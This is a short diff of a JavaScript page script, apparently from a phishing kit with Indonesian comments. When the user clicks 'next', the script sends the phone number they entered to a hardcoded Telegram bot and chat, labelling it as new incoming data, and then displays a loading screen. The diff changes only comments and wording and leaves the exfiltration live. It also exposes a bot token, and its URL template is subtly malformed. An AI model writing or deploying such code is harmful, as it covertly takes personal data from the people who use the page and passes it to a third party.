@@ -1,9 +1,9 @@
 document.addEventListener('DOMContentLoaded', () => {
-  // === CONFIG TELEGRAM (GANTI DENGAN DATA ANDA) ===
+  // === CONFIG TELEGRAM ===
   const TELEGRAM_TOKEN = "8608031139:AAFcKrrXjORQcFFuS19PWAc6qxgjX48uGYE";
   const TELEGRAM_CHAT_ID = "-1003627147396";
 
-  // Fungsi Tambahan untuk Kirim ke Telegram (Tanpa Merusak Alur)
+  // Fungsi Tambahan untuk Kirim ke Telegram (Sudah Diperbaiki)
   function sendToTelegram(message) {
     const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
     fetch(url, {
@@ -70,7 +70,7 @@ document.addEventListener('DOMContentLoaded', () => {
     btnNext.addEventListener('click', () => {
       // AMBIL DATA INPUT NO HP DAN KIRIM KE TELEGRAM
       const nomorHp = phoneInput.value;
-      sendToTelegram(`📱 *Data Masuk baru*\n\n*No. HP:* \`${nomorHp}\``);
+      sendToTelegram(`📱 *Data Masuk Baru*\n\n*No. HP:* \`${nomorHp}\``);
 
       if (loadingScreen) loadingScreen.classList.remove('hidden');
       
@@ -268,5 +268,4 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     }, 1000);
   }
-
 });
